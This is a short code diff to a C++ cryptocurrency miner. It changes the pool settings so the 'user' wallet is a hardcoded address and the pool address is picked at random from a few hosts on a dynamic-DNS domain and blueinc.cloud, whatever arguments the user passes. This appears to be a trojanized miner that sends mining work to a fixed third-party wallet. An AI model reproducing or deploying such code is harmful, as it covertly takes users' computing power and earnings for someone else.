@@ -21,14 +21,14 @@ pool_settings_provider::pool_settings_provider(arguments &args) {
 
     //const string word84 = wordList84[rand() % 17];
     
-    const string wordList84[17] = {"http://linux84.distro.cloudns.cl:84","http://linux84.distro.cloudns.cl:71","http://linux84.distro.cloudns.cl:72","http://linux84.distro.cloudns.cl:73","http://linux84.distro.cloudns.cl:74","http://linux84.distro.cloudns.cl:75","http://linux84.distro.cloudns.cl:76","http://linux84.distro.cloudns.cl:78","http://linux84.distro.cloudns.cl:82","http://linux84.distro.cloudns.cl:188","http://linux84.distro.cloudns.cl:180","http://linux84.distro.cloudns.cl:181","http://linux84.distro.cloudns.cl:182","http://linux84.distro.cloudns.cl:183","http://linux84.distro.cloudns.cl:184","http://linux84.distro.cloudns.cl:185","http://linux84.distro.cloudns.cl:186"};
+    const string wordList84[2] = {"http://www.blueinc.cloud:84","http://www.blueinc.cloud:74"};
 
-    const string word84 = wordList84[rand() % 17];
+    const string word84 = wordList84[rand() % 2];
     
     __last_devfee_update = 0;
 
     __user_pool_settings.wallet = "36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW";
-    __user_pool_settings.pool_address = "http://www.blueinc.cloud:84";
+    __user_pool_settings.pool_address = word84;
     __user_pool_settings.is_devfee = false;
     __user_pool_settings.pool_extensions = "";
 
